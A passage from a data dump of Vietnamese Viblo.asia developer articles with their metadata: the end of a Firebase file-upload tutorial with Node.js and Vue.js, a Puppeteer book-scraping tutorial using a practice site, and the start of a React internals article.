`blobWriter`\n```JS\nblobWriter.on('error', (err) => {\n    console.log(err)\n})\n```\n\nKhi upload file th\u00e0nh c\u00f4ng ch\u00fang t\u1ea7 tr\u1ea3 d\u1eef li\u1ec7u t\u1edbi client v\u1edbi s\u1ef1 ki\u1ec7n `finish`\n```JS\nblobWriter.on('finish', () => {\n    res.status(200).send(\"File uploaded.\")\n})\n```\n\nV\u00e0 khi d\u1eef li\u1ec7u \u0111\u01b0\u1ee3c x\u1eed l\u00fd ho\u00e0n to\u00e0n s\u1ef1 ki\u1ec7n `end` s\u1ebd \u0111\u01b0\u1ee3c g\u1ecdi\n```JS\nblobWriter.end(req.file.buffer)\n```\n\nNh\u01b0 v\u1eady ch\u00fang ta \u0111\u00e3 t\u1ea1o xong Node.js API \u0111\u1ec3 upload files l\u00ean Firebase Cloud Storage. \n\n**`index.js`**\n\n```JS\nconst express = require('express')\nconst multer = require('multer')\nconst firebase = require('./firebase')\nconst app = express()\n\napp.use(express.urlencoded({extended: false}))\napp.use(express.json({extended: false}))\n\nconst upload = multer({\n    storage: multer.memoryStorage()\n})\n\napp.post('/upload', upload.single('file'), (req, res) => {\n    if(!req.file) {\n        return res.status(400).send(\"Error: No files found\")\n    } \n\n    const blob = firebase.bucket.file(req.file.originalname)\n    \n    const blobWriter = blob.createWriteStream({\n        metadata: {\n            contentType: req.file.mimetype\n        }\n    })\n    \n    blobWriter.on('error', (err) => {\n        console.log(err)\n    })\n    \n    blobWriter.on('finish', () => {\n        res.status(200).send(\"File uploaded.\")\n    })\n    \n    blobWriter.end(req.file.buffer)\n})\n\napp.listen(3001, () => {\n    console.log('\ud83d\ude80Server listening on port 3001')\n})\n```\n\n## Frontend v\u1edbi Vue.js\n\nCh\u00fang ta s\u1ebd t\u1ea1o frontend \u0111\u1ec3 th\u1ef1c hi\u1ec7n upload file v\u1edbi Vue.js. T\u1ea1o m\u1ed9t input filed v\u00e0 m\u1ed9t button \u0111\u1ec3 g\u1ecdi t\u1edbi API.\n```JS\n<input type=\"file\" ref=\"file\" v-on:change=\"handleUpload()\"/>\n<button v-on:click=\"uploadFile()\">Upload</button>\n```\n\nTi\u1ebfp \u0111\u00f3, c\u1ea7n th\u00eam function `handleUpload` \u0111\u1ec3 k\u00edch ho\u1ea1t khi ng\u01b0\u1eddi d\u00f9ng ch\u1ecdn t\u1ec7p tin. Khi ng\u01b0\u1eddi d\u00f9ng ch\u1ecdn file `handleUpload` s\u1ebd k\u00edch ho\u1ea1t v\u00e0 input file s\u1ebd \u0111\u01b0\u1ee3c l\u01b0u v\u00e0o bi\u1ebfn.\n\n```JS\n<script>\n  export default {\n    data() {\n        return {\n            file: ''\n        }\n    },\n    methods: {\n      handleFileUpload(){\n          this.file = this.$refs.file.files[0]\n      },\n      uploadFile(){\n          \n      }\n    }\n  }\n</script>\n```\n\nS\u1eed d\u1ee5ng `FormData` \u0111\u1ec3 t\u1ea1o object ch\u01b0a th\u00f4ng tin file v\u00e0 append file v\u00e0 formData.\n```\nconst formData = new FormData()\nformData.append(\"file\", this.file)\n```\n\nT\u00ean file ph\u00eda backend API `upload.single(<field name>)` ph\u1ea3i gi\u1ed1ng v\u1edbi t\u00ean file trong formData.\n\nCu\u1ed1i c\u00f9ng, ch\u00fang ta c\u00f3 th\u1ec3 send file t\u1edbi API v\u1edbi Axios \u0111\u1ec3 post d\u1eef li\u1ec7u.\n\n```JS\naxios.post('http://localhost:3001/upload', formData, {\n    headers: {\n        \"Content-Type\": \"multipart/form-data\"\n    }\n}).then(response => {\n    console.log(response.data)\n}).catch(error => {\n    console.log(error)\n})\n```\n\nFile `vue.js` cu\u1ed1i c\u00f9ng:\n\n```JS\n<template>\n  <div id=\"app\">\n    <input type=\"file\" ref=\"file\" v-on:change=\"handleUpload()\"/>\n    <button v-on:click=\"uploadFile()\">Upload</button> <br>\n  </div>\n</template>\n\n<script>\nimport axios from 'axios'\nexport default {\n    data () {\n        return {\n          file: ''\n        }\n    },\n    methods: {\n        handleUpload() {\n            this.file = this.$refs.file.files[0]\n        },\n        uploadFile() {\n            const formData = new FormData()\n            formData.append(\"file\", this.file)\n            axios.post('http://localhost:3001/upload', formData, {\n                headers: {\n                    \"Content-Type\": \"multipart/form-data\"\n                }\n            }).then(response => {\n                console.log(response.data)\n            }).catch(error => {\n                console.log(error)\n            })\n        }\n    }\n}\n</script>\n```\n\nNh\u01b0 v\u1eady, ch\u00fang ta \u0111\u00e3 t\u1ea1o th\u00e0nh c\u00f4ng m\u1ed9t \u1ee9ng d\u1ee5ng upload file v\u1edbi Node.js v\u00e0 Vue.js t\u1edbi Firebase.\n \n Ch\u00fang ta c\u00f3 th\u1ec3 l\u1ea5y full code project [t\u1ea1i \u0111\u00e2y](https://github.com/vietpt-1430/upload-files-firebase) \n\nN\u1ebfu b\u1ea1n c\u00f3 b\u1ea5t k\u1ef3 nghi ng\u1edd n\u00e0o ho\u1eb7c c\u1ea7n l\u00e0m r\u00f5 th\u00eam, h\u00e3y cho t\u00f4i bi\u1ebft trong ph\u1ea7n b\u00ecnh lu\u1eadn. T\u00f4i r\u1ea5t vui \u0111\u01b0\u1ee3c gi\u00fap b\u1ea1n. N\u1ebfu b\u1ea1n th\u1ea5y b\u00e0i vi\u1ebft n\u00e0y h\u1eefu \u00edch ho\u1eb7c th\u00fa v\u1ecb, h\u00e3y xem x\u00e9t gi\u00e0nh t\u1eb7ng 1 upvote nh\u00e9.",
      published_at: "2021-03-19 10:41:40",
      is_published: true,
      is_shared: false,
      updated_at: "2021-03-20 10:00:25",
      translation_source: null,
      trend_at: null,
      promoted_at: null,
      reading_time: 5,
      points: 1,
      views_count: 20,
      clips_count: 0,
      comments_count: 0,
      rated_value: null,
      promoted: false,
      trending: false,
      is_draft: false,
      is_public: true,
      locale_code: "vi",
      is_video: false,
      thumbnail_url: null,
      user: {
        data: {
          id: 23490,
          url: "https://viblo.asia/u/phamtuanviet",
          avatar: "0bf0df3a-cd78-4e0a-a7b1-ce6938864e43.JPG",
          name: "Pham Tuan Viet",
          username: "phamtuanviet",
          followers_count: 6,
          reputation: 226,
          posts_count: 20,
          banned_at: null,
          following: false,
        },
      },
      tags: {
        data: [
          {
            slug: "nodejs",
            name: "Node.js",
            primary: false,
            image:
              "https://placehold.jp/16/8e44ad/ffffff/80x80.jpg?text=Nodejs&css=%7B%22padding%22%3A%223px%22%7D",
          },
          {
            slug: "happy-new-year",
            name: "Happy New Year",
            primary: false,
            image:
              "https://placehold.jp/16/2980b9/ffffff/80x80.jpg?text=Happy+New+Year&css=%7B%22padding%22%3A%223px%22%7D",
          },
        ],
      },
      commentators: {
        data: [],
      },
    },
    {
      id: 50707,
      title:
        "Crawl website s\u1eed d\u1ee5ng Node.js v\u00e0 Puppeteer - ph\u1ea7n 2",
      slug: "3P0lP1kn5ox",
      url:
        "https://viblo.asia/p/crawl-website-su-dung-nodejs-va-puppeteer-phan-2-3P0lP1kn5ox",
      user_id: 9372,
      moderation: null,
      transliterated: "crawl-website-su-dung-nodejs-va-puppeteer-phan-2",
      contents_short:
        "trong  ph\u1ea7n 1 m\u00ecnh \u0111\u00e3 gi\u1edbi thi\u1ec7u v\u1ec1 puppeteer v\u00e0 t\u1ea1o \u0111\u01b0\u1ee3c 1 project c\u00f9ng m\u1ed9t s\u1ed1 file \u0111\u1ea7u ti\u00ean \u0111\u1ec3 c\u00e1c b\u1ea1n c\u00f3 th\u1ec3 crawl d\u1eef li\u1ec7u t\u1eeb m\u1ed9t trang web b\u1ea5t k\u1ef3. B\u00e0i n\u00e0y m\u00ecnh s\u1ebd ti\u1ebfp n\u1ed1i b\u00e0i vi\u1ebft tr\u01b0\u1edbc \u0111\u1ec3 ho\u00e0...",
      contents:
        "trong  [ph\u1ea7n 1](https://viblo.asia/p/crawl-website-su-dung-nodejs-va-puppeteer-phan-1-L4x5xv2wZBM) m\u00ecnh \u0111\u00e3 gi\u1edbi thi\u1ec7u v\u1ec1 `puppeteer` v\u00e0 t\u1ea1o \u0111\u01b0\u1ee3c 1 project c\u00f9ng m\u1ed9t s\u1ed1 file \u0111\u1ea7u ti\u00ean \u0111\u1ec3 c\u00e1c b\u1ea1n c\u00f3 th\u1ec3 crawl d\u1eef li\u1ec7u t\u1eeb m\u1ed9t trang web b\u1ea5t k\u1ef3. B\u00e0i n\u00e0y m\u00ecnh s\u1ebd ti\u1ebfp n\u1ed1i b\u00e0i vi\u1ebft tr\u01b0\u1edbc \u0111\u1ec3 ho\u00e0n thi\u1ec7n seri n\u00e0y.\n\n\u0111\u1ea7u ti\u1ec1n c\u00e1c b\u1ea1n c\u00f3 th\u1ec3 v\u00e0o site [n\u00e0y](http://books.toscrape.com/) \u0111\u1ec3 xem c\u1ea5u tr\u00fac html c\u1ee7a trang web, \u0111\u1ea7u ti\u1ec1n n\u00f3 c\u00f3 1 categories list tr\u00ean tr\u00e1i c\u1ee7a website, \u1edf gi\u1eefa l\u00e0 ph\u1ea7n hi\u1ec3n th\u1ecb nh\u1eefng quy\u1ec3n s\u00e1ch c\u1ee7a t\u1ea5t c\u1ea3 categories ho\u1eb7c c\u1ee7a t\u1eebng category m\u1ed9t.\nch\u00fang ta c\u00f3 th\u1ec3 th\u1ea5y trang web n\u00e0y kh\u00e1 \u0111\u01a1n gi\u1ea3n \u0111\u1ec3 crawl to\u00e0n b\u1ed9 d\u1eef li\u1ec7u c\u1ee7a s\u00e1ch v\u1ec1 theo t\u1eebng category m\u1ed9t.\n\u0111\u1ea7u ti\u00ean ch\u00fang ta c\u1ea7n ph\u1ea3i l\u1ea5y \u0111\u01b0\u1ee3c to\u00e0n b\u1ed9 url c\u1ee7a s\u00e1ch c\u1ee7a trang web, update file `pageScraper.js` nh\u01b0 sau:\n\n```js\n// ./book-scraper/pageScraper.js\nconst scraperObject = {\n    url: 'http://books.toscrape.com',\n    async scraper(browser){\n        let page = await browser.newPage();\n        console.log(`Navigating to ${this.url}...`);\n        // Navigate to the selected page\n        await page.goto(this.url);\n        // Wait for the required DOM to be rendered\n        await page.waitForSelector('.page_inner');\n        // Get the link to all the required books\n        let urls = await page.$$eval('section ol > li', links => {\n            // Make sure the book to be scraped is in stock\n            links = links.filter(link => link.querySelector('.instock.availability > i').textContent !== \"In stock\")\n            // Extract the links from the data\n            links = links.map(el => el.querySelector('h3 > a').href)\n            return links;\n        });\n        console.log(urls);\n    }\n}\n\nmodule.exports = scraperObject;\n```\n\n\u0111o\u1ea1n code tr\u00ean s\u1ebd gi\u00fap ta l\u1ea5y \u0111\u01b0\u1ee3c to\u00e0n b\u1ed9 url c\u1ee7a s\u00e1ch trong page, nh\u01b0ng h\u00e0m b\u00ean tr\u00ean nh\u01b0 newPage, waitForSelector, hay $$eval m\u00ecnh \u0111\u1ec1u \u0111\u00e3 gi\u1edbi thi\u1ec7u trong ph\u1ea7n m\u1ed9t r\u1ed3i, n\u1ebfu ch\u01b0a hi\u1ec3u n\u00f3 b\u1ea1n c\u00f3 th\u1ec3 quay l\u1ea1i \u0111\u1ecdc ph\u1ea7n 1 nh\u00e9.\n\nKhi ch\u1ea1y `npm run start` b\u1ea1n s\u1ebd th\u1ea5y trong console c\u1ee7a m\u00ecnh in ra logs c\u1ee7a to\u00e0n b\u1ed9 c\u00e1c url:\n\n```log\n> node index.js\n\nOpening the browser......\nNavigating to http://books.toscrape.com...\n[\n  'http://books.toscrape.com/catalogue/a-light-in-the-attic_1000/index.html',\n  'http://books.toscrape.com/catalogue/tipping-the-velvet_999/index.html',\n  'http://books.toscrape.com/catalogue/soumission_998/index.html',\n  'http://books.toscrape.com/catalogue/sharp-objects_997/index.html',\n  'http://books.toscrape.com/catalogue/sapiens-a-brief-history-of-humankind_996/index.html',\n  'http://books.toscrape.com/catalogue/the-requiem-red_995/index.html',\n  'http://books.toscrape.com/catalogue/the-dirty-little-secrets-of-getting-your-dream-job_994/index.html',\n  'http://books.toscrape.com/catalogue/the-coming-woman-a-novel-based-on-the-life-of-the-infamous-feminist-victoria-woodhull_993/index.html',\n  'http://books.toscrape.com/catalogue/the-boys-in-the-boat-nine-americans-and-their-epic-quest-for-gold-at-the-1936-berlin-olympics_992/index.html',\n  'http://books.toscrape.com/catalogue/the-black-maria_991/index.html',\n  'http://books.toscrape.com/catalogue/starving-hearts-triangular-trade-trilogy-1_990/index.html',\n  'http://books.toscrape.com/catalogue/shakespeares-sonnets_989/index.html',\n  'http://books.toscrape.com/catalogue/set-me-free_988/index.html',\n  'http://books.toscrape.com/catalogue/scott-pilgrims-precious-little-life-scott-pilgrim-1_987/index.html',\n  'http://books.toscrape.com/catalogue/rip-it-up-and-start-again_986/index.html',\n  'http://books.toscrape.com/catalogue/our-band-could-be-your-life-scenes-from-the-american-indie-underground-1981-1991_985/index.html',\n  'http://books.toscrape.com/catalogue/olio_984/index.html',\n  'http://books.toscrape.com/catalogue/mesaerion-the-best-science-fiction-stories-1800-1849_983/index.html',\n  'http://books.toscrape.com/catalogue/libertarianism-for-beginners_982/index.html',\n  'http://books.toscrape.com/catalogue/its-only-the-himalayas_981/index.html'\n]\n```\n\nsau khi c\u00f3 url c\u1ee7a c\u00e1c s\u00e1ch r\u1ed3i, ch\u00fang ta c\u00f3 th\u1ec3 v\u00e0o url c\u1ee7a t\u1eebng quy\u1ec3n s\u00e1ch \u0111\u1ec3 l\u1ea5y d\u1eef li\u1ec7u detail c\u1ee7a n\u00f3:\n\nti\u1ebfp t\u1ee5c update file `/book-scraper/pageScraper.js` v\u1edbi n\u1ed9i dung m\u1edbi nh\u01b0 sau:\n\n```js\n// ./book-scraper/pageScraper.js\nconst scraperObject = {\n    url: 'http://books.toscrape.com',\n    async scraper(browser){\n        let page = await browser.newPage();\n        console.log(`Navigating to ${this.url}...`);\n        // Navigate to the selected page\n        await page.goto(this.url);\n        // Wait for the required DOM to be rendered\n        await page.waitForSelector('.page_inner');\n        // Get the link to all the required books\n        let urls = await page.$$eval('section ol > li', links => {\n            // Make sure the book to be scraped is in stock\n            links = links.filter(link => link.querySelector('.instock.availability > i').textContent !== \"In stock\")\n            // Extract the links from the data\n            links = links.map(el => el.querySelector('h3 > a').href)\n            return links;\n        });\n\n\n        // Loop through each of those links, open a new page instance and get the relevant data from them\n        let pagePromise = (link) => new Promise(async(resolve, reject) => {\n            let dataObj = {};\n            let newPage = await browser.newPage();\n            await newPage.goto(link);\n            dataObj['bookTitle'] = await newPage.$eval('.product_main > h1', text => text.textContent);\n            dataObj['bookPrice'] = await newPage.$eval('.price_color', text => text.textContent);\n            dataObj['noAvailable'] = await newPage.$eval('.instock.availability', text => {\n                // Strip new line and tab spaces\n                text = text.textContent.replace(/(\\r\\n\\t|\\n|\\r|\\t)/gm, \"\");\n                // Get the number of stock available\n                let regexp = /^.*\\((.*)\\).*$/i;\n                let stockAvailable = regexp.exec(text)[1].split(' ')[0];\n                return stockAvailable;\n            });\n            dataObj['imageUrl'] = await newPage.$eval('#product_gallery img', img => img.src);\n            dataObj['bookDescription'] = await newPage.$eval('#product_description', div => div.nextSibling.nextSibling.textContent);\n            dataObj['upc'] = await newPage.$eval('.table.table-striped > tbody > tr > td', table => table.textContent);\n            resolve(dataObj);\n            await newPage.close();\n        });\n\n        for(link in urls){\n            let currentPageData = await pagePromise(urls[link]);\n            // scrapedData.push(currentPageData);\n            console.log(currentPageData);\n        }\n\n    }\n}\n\nmodule.exports = scraperObject;\n```\n\n\u0111o\u1ea1n code tr\u00ean s\u1ebd l\u1eb7p qua c\u00e1c urls detail c\u1ee7a t\u1eebng quy\u1ec3n s\u00e1ch \u0111\u1ec3 l\u1ea5y ra th\u00f4ng tin nh\u01b0: id, title, price, img ...\n\nti\u1ebfp theo b\u1ea1n ch\u1ea1y `npm run start` th\u00ec s\u1ebd nh\u00ecn th\u1ea5y d\u1eef li\u1ec7u detail c\u1ee7a c\u00e1c quy\u1ec3n s\u00e1ch, t\u1eeb \u0111\u00f3 b\u1ea1n th\u1ec3 th\u1ec3 l\u01b0u n\u00f3 ra file hay l\u01b0u l\u1ea1i v\u00e0o database.\n\n```log\nOpening the browser......\nNavigating to http://books.toscrape.com...\n{\n  bookTitle: 'A Light in the Attic',\n  bookPrice: '\u00a351.77',\n  noAvailable: '22',\n  imageUrl: 'http://books.toscrape.com/media/cache/fe/72/fe72f0532301ec28892ae79a629a293c.jpg',\n  bookDescription: \"It's hard to imagine a world without A Light in the Attic. [...]',\n  upc: 'a897fe39b1053632'\n}\n{\n  bookTitle: 'Tipping the Velvet',\n  bookPrice: '\u00a353.74',\n  noAvailable: '20',\n  imageUrl: 'http://books.toscrape.com/media/cache/08/e9/08e94f3731d7d6b760dfbfbc02ca5c62.jpg',\n  bookDescription: `\"Erotic and absorbing...Written with starling power.\"--\"The New York Times Book Review \" Nan King, an oyster girl, is captivated by the music hall phenomenon Kitty Butler [...]`,\n  upc: '90fa61229261140a'\n}\n{\n  bookTitle: 'Soumission',\n  bookPrice: '\u00a350.10',\n  noAvailable: '20',\n  imageUrl: 'http://books.toscrape.com/media/cache/ee/cf/eecfe998905e455df12064dba399c075.jpg',\n  bookDescription: 'Dans une France assez proche de la n\u00f4tre, [...]',\n  upc: '6957f44c3847a760'\n}\n...\n```\n\nok c\u00f3 l\u1ebd \u0111\u1ebfn \u0111\u00e2y b\u1ea1n c\u0169ng \u0111\u00e3 hi\u1ec3u \u0111\u01b0\u1ee3c c\u00e1ch ho\u1eb7t \u0111\u1ed9ng c\u1ee7a `puppeteer` r\u1ed3i, m\u00ecnh s\u1ebd gi\u1edbi thi\u1ec7u th\u00eam m\u1ed9t s\u1ed1 ph\u1ea7n h\u01b0u \u00edch n\u1eefa khi d\u00f9ng `puppeteer`\n\n### puppeteer v\u1edbi proxy\n\nkhi b\u1ea1n crawl d\u1eef li\u1ec7u nhi\u1ec1u trang web s\u1ebd ph\u00e1t hi\u1ec7n ra b\u1ea1n truy c\u1eadp b\u1ea5t th\u01b0\u1eddng v\u00e0 b\u1eadt captra l\u00ean, b\u1ea1n c\u00f3 th\u1ec3 tr\u00e1nh b\u1ecb ph\u00e1t hi\u1ec7n l\u00e0\nB\u1ea1n c\u1ea7n setup khi start puppeteer nh\u01b0 sau \u0111\u1ec3 ch\u1ea1y v\u1edbi proxy:\n\n```js\n   getBrowserProxy: async (proxy) => {\n        return await puppeteer.launch({\n            headless: true,\n            ignoreHTTPSErrors: true,\n            args: [\n                '--proxy-server=' + proxy,\n                '--no-sandbox',\n                '--disable-setuid-sandbox',\n                '--start-maximized',\n            ]\n        });\n    },\n```\n\n\u1edf \u0111\u00e2y `proxy` s\u1ebd c\u00f3 \u0111\u1ecbnh d\u1ea1ng `ip:port` ex: '203.205.29.90:45425', l\u01b0u \u00fd proxy c\u00f2n c\u00f3 c\u00e1c lo\u1ea1i nh\u01b0 HTTP, HTTPS, SOCKS4, SOCKS5 th\u00ec b\u1ea1n c\u1ea7n \u0111\u1eb7t type c\u1ee7a proxy \u1edf ph\u00eda tr\u01b0\u1edbc nh\u01b0 \n'socks4://203.205.29.90:45425'\n\n### Deploy puppeteer tr\u00ean centos\n\nkhi m\u00ecnh c\u00e0i \u0111\u1eb7t v\u00e0 deploy source l\u00ean server centos c\u00f3 g\u1eb7p 1 l\u1ed7i `UnhandledPromiseRejectionWarning: Unhandled promise rejection (rejection id: 1): Error: Failed to connect to chrome!`, c\u00e1i n\u00e0y b\u1ea1n c\u1ea7n c\u00e0i \u0111\u1eb7t 1 l\u1ec7nh tr\u00ean chrome nh\u01b0 sau:\n\n```sh\nyum install pango.x86_64 libXcomposite.x86_64 libXcursor.x86_64 libXdamage.x86_64 libXext.x86_64 libXi.x86_64 libXtst.x86_64 cups-libs.x86_64 libXScrnSaver.x86_64 libXrandr.x86_64 GConf2.x86_64 alsa-lib.x86_64 atk.x86_64 gtk3.x86_64 ipa-gothic-fonts xorg-x11-fonts-100dpi xorg-x11-fonts-75dpi xorg-x11-utils xorg-x11-fonts-cyrillic xorg-x11-fonts-Type1 xorg-x11-fonts-misc -y\n```\n\nb\u1ea1n c\u00f3 th\u1ec3 tham kh\u1ea3o l\u1ed7i t\u1ea1i \u0111\u00e2y:\n\n- https://github.com/puppeteer/puppeteer/issues/391\n\n\n## Tham kh\u1ea3o\n\n- http://books.toscrape.com/catalogue/category/books/travel_2/index.html\n- https://github.com/puppeteer/puppeteer",
      published_at: "2021-02-18 15:00:26",
      is_published: true,
      is_shared: false,
      updated_at: "2021-03-20 11:12:06",
      translation_source: null,
      trend_at: null,
      promoted_at: null,
      reading_time: 3,
      points: 1,
      views_count: 100,
      clips_count: 0,
      comments_count: 2,
      rated_value: null,
      promoted: false,
      trending: false,
      is_draft: false,
      is_public: true,
      locale_code: "en",
      is_video: false,
      thumbnail_url: null,
      user: {
        data: {
          id: 9372,
          url: "https://viblo.asia/u/nguyen.van.duong",
          avatar: "873174e5-bc11-4fb3-b2c7-1cc6537fc78c.gif",
          name: "Nguyen Van Duong",
          username: "nguyen.van.duong",
          followers_count: 32,
          reputation: 1098,
          posts_count: 52,
          banned_at: null,
          following: false,
        },
      },
      tags: {
        data: [
          {
            slug: "puppeteer",
            name: "puppeteer",
            primary: false,
            image:
              "https://placehold.jp/16/d35400/ffffff/80x80.jpg?text=puppeteer&css=%7B%22padding%22%3A%223px%22%7D",
          },
          {
            slug: "nodejs",
            name: "Node.js",
            primary: false,
            image:
              "https://placehold.jp/16/f39c12/ffffff/80x80.jpg?text=Nodejs&css=%7B%22padding%22%3A%223px%22%7D",
          },
        ],
      },
      commentators: {
        data: [
          {
            id: 44757,
            url: "https://viblo.asia/u/thungrac43",
            avatar: "efec8b96-11b2-4024-a832-56eb8dfe2196.jpg",
            name: "rac thung",
            username: "thungrac43",
            followers_count: 0,
            reputation: 0,
            posts_count: 0,
            banned_at: null,
          },
          {
            id: 56658,
            url: "https://viblo.asia/u/phuongvu",
            avatar: "cea8f078-09a3-49d8-9292-85bea863ce84.jpg",
            name: "Ph\u01b0\u01a1ng V\u0169",
            username: "phuongvu",
            followers_count: 0,
            reputation: 0,
            posts_count: 0,
            banned_at: null,
          },
        ],
      },
    },
    {
      id: 50137,
      title: "\u0110i\u1ec1u React lu\u00f4n gi\u1eef k\u00edn trong tim",
      slug: "WAyK893oZxX",
      url: "https://viblo.asia/p/dieu-react-luon-giu-kin-trong-tim-WAyK893oZxX",
      user_id: 23999,
      moderation: null,
      transliterated: "dieu-react-luon-giu-kin-trong-tim",
      contents_short:
        "\u25a0 M\u1edf \u0111\u1ea7u\nNg\u1ed3i vi\u1ebft b\u00e0i khi \u0111ang ngh\u0129 vu v\u01a1 chuy\u1ec7n con g\u00e0 hay qu\u1ea3 tr\u1ee9ng c\u00f3 tr\u01b0\u1edbc, m\u00ecnh ph\u00e2n v\u00e2n ch\u01b0a bi\u1ebft s\u1ebd ch\u1ecdn ch\u1ee7 \u0111\u1ec1 g\u00ec \u0111\u1ec3 ch\u00fang ta c\u00f3 th\u1ec3 c\u00f9ng nhau b\u00e0n lu\u1eadn. Nh\u1edb c\u00f3 l\u1ea7n m\u1ed9t ng\u01b0\u1eddi anh c\u1ee7a m\u00ecnh t...",
      contents:
        '## \u25a0 M\u1edf \u0111\u1ea7u\nNg\u1ed3i vi\u1ebft b\u00e0i khi \u0111ang ngh\u0129 vu v\u01a1 chuy\u1ec7n con g\u00e0 hay qu\u1ea3 tr\u1ee9ng c\u00f3 tr\u01b0\u1edbc, m\u00ecnh ph\u00e2n v\u00e2n ch\u01b0a bi\u1ebft s\u1ebd ch\u1ecdn ch\u1ee7 \u0111\u1ec1 g\u00ec \u0111\u1ec3 ch\u00fang ta c\u00f3 th\u1ec3 c\u00f9ng nhau b\u00e0n lu\u1eadn. Nh\u1edb c\u00f3 l\u1ea7n [m\u1ed9t ng\u01b0\u1eddi anh c\u1ee7a m\u00ecnh](https://viblo.asia/u/bui.gia.thinh) t\u1eebng chia s\u1ebb:\n```hs\n- Vi\u1ebft code th\u00ec d\u1ec5 th\u00f4i, vi\u1ebft code \u0111\u1ec3 t\u1ed1i \u01b0u m\u1edbi kh\u00f3 !\n```\nC\u01a1 m\u00e0 tr\u01b0\u1edbc khi mu\u1ed1n t\u1ed1i \u01b0u th\u00ec ph\u1ea3i hi\u1ec3u n\u00f3 \u0111\u00e3. Th\u00ec v\u1eabn l\u00e0 c\u00e2u chuy\u1ec7n xoay quanh anh b\u1ea1n `ReactJS`, nh\u01b0ng s\u1ebd quay v\u1ec1 thu\u1edf s\u01a1 khai kh\u1edfi t\u1ea1o d\u1ef1 \u00e1n b\u1eb1ng [`Create React App`](https://github.com/facebook/create-react-app), t\u00ecm hi\u1ec3u v\u1ec1:\n```js\nReact - Behind the scenes,\n\u0110i\u1ec1u React lu\u00f4n gi\u1eef k\u00edn trong tim :v \n```\nnh\u00e9, c\u00f3 \u0111\u01b0\u1ee3c kh\u00f4ng n\u00e0o :smile:))\n\n![](https://images.viblo.asia/8a1d3d88-1171-40c7-890d-04aa5227bc22.png)\n\nTrong b\u00e0i vi\u1ebft n\u00e0y, v\u1edbi `folder structure` \u0111\u01b0\u1ee3c t\u1ea1o b\u1edfi [`Create React App`](https://github.com/facebook/create-react-app) *(v4.0.1)*, ch\u00fang m\u00ecnh s\u1ebd c\u00f9ng nhau t\u00ecm hi\u1ec3u v\u1ec1 `02 v\u1ea5n \u0111\u1ec1` sau:\n- Li\u00ean k\u1ebft ng\u1ea7m gi\u1eefa `index.js` \u2013 `index.html`?\n- `index.html` `"tr\u1eafng tr\u01a1n"` tr\u00ean `browser`?\n\n*B\u1eaft \u0111\u1ea7u th\u00f4i!*\n\n![](https://i.imgur.com/cxecklr.gif)\n\n*\u0110\u1ea7u ti\u00ean, h\u00e3y c\u00f9ng nhau xem l\u1ea1i [`Create React App`](https://github.com/facebook/create-react-app) m\u1ed9t ch\u00fat!*\n\n*B\u1ea1n n\u00e0o r\u00e0nh \u0111o\u1ea1n n\u00e0y r\u1ed3i th\u00ec c\u00f3 th\u1ec3 chuy\u1ec3n qua [M\u1ee5c ti\u1ebfp theo](https://viblo.asia/p/dieu-react-luon-giu-kin-trong-tim-WAyK893oZxX#_-lien-ket-ngam-indexjs--indexhtml-4) lu\u00f4n nhaa ^^*\n\n\n## \u25a0 Creater React App\n\n### \u0110\u1ecbnh ngh\u0129a\n\nTheo *[Official document](https://create-react-app.dev/docs/getting-started/)*:\n> Create React App is an officially supported way to create single-page React applications with no configuration.\n\n\n\u0110\u00fang l\u00e0 nh\u01b0 v\u1eady, `Create React App` gi\u00fap ch\u00fang ta t\u1ea5t c\u1ea3 c\u00e1c b\u01b0\u1edbc t\u1eeb A - Z \u0111\u1ec3 kh\u1edfi t\u1ea1o m\u1ed9t \u1ee9ng d\u1ee5ng `ReactJS`: *t\u1eeb `setup` cho t\u1edbi `config`; t\u1eeb thi\u1ebft l\u1eadp `Babel` d\u1ecbch `JSX` cho t\u1edbi c\u1ea5u h\u00ecnh `webpack`, \u0111\u00f3ng g\u00f3i c\u00e1c t\u00e0i nguy\u00ean, etc.*\n\n\u0110i\u1ec1u duy nh\u1ea5t ch\u00fang ta c\u1ea7n l\u00e0m c\u00f3 l\u1ebd l\u00e0:\n```\n- Run command & enjoy !!!\n```\n\nQu\u1ea3 l\u00e0 sinh ra cho \u0111\u1eddi b\u1edbt kh\u1ed5 m\u00e0 :smile: :smile:))\n\n### C\u1ea5u tr\u00fac th\u01b0 m\u1ee5c\n\u0110\u00e2y l\u00e0 v\u1ecb tr\u00ed c\u00e1c file `index.html`, `index.js` m\u00ecnh \u0111\u1ec1 c\u1eadp \u0111\u1ebfn trong ph\u1ea1m vi b\u00e0i vi\u1ebft n\u00e0y:\n```\n\ud83e\uddca application\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 package.json\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 public\n\u2502            \u251c\u2500\u2500\u2500\u2500 \ud83d\udcc4 index.html\n\u2502            \u251c\u2500\u2500\u2500\u2500 ...\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 src\n\u2502            \u251c\u2500\u2500\u2500\u2500 \ud83d\udccb index.js\n\u2502            \u251c\u2500\u2500\u2500\u2500 ...\n\u251c\u2500\u2500 ...\n```\n\n#### Notes:\n*N\u1ebfu b\u1ea1n ch\u01b0a t\u1eebng s\u1eed d\u1ee5ng `Create React App` hay ch\u01b0a c\u00f3 tr\u1ea3i nghi\u1ec7m n\u00e0o v\u1edbi `ReactJS`, h\u00e3y th\u1eed l\u00e0m theo h\u01b0\u1edbng d\u1eabn v\u00e0 v\u1ecdc v\u1ea1ch m\u1ed9t ch\u00fat \u0111\u1ec3 n\u1eafm \u0111\u01b0\u1ee3c vai tr\u00f2 ch\u00ednh c\u1ee7a c\u00e1c `files` n\u00e0y tr\u01b0\u1edbc khi \u0111\u1ecdc ti\u1ebfp nh\u00e9. Chi ti\u1ebft c\u00f3 th\u1ec3 [tham kh\u1ea3o t\u1ea1i \u0111\u00e2y](https://www.freecodecamp.org/news/quick-guide-to-understanding-and-creating-reactjs-apps-8457ee8f7123/).*\n\n*B\u00e2y gi\u1edd th\u00ec ch\u00fang ta l\u1ea7n l\u01b0\u1ee3t \u0111i t\u00ecm c\u00e2u tr\u1ea3 l\u1eddi cho `02 v\u1ea5n \u0111\u1ec1 ph\u00eda tr\u00ean` n\u00e0o!*\n\n![](https://i.imgur.com/mfpmwki.gif)\n\n## \u25a0 Li\u00ean k\u1ebft ng\u1ea7m: `index.js` \u2013 `index.html`?\nCh\u00fang ta c\u00f3 `index.html` ch\u1ee9a `div#root`:\n```html\n<div 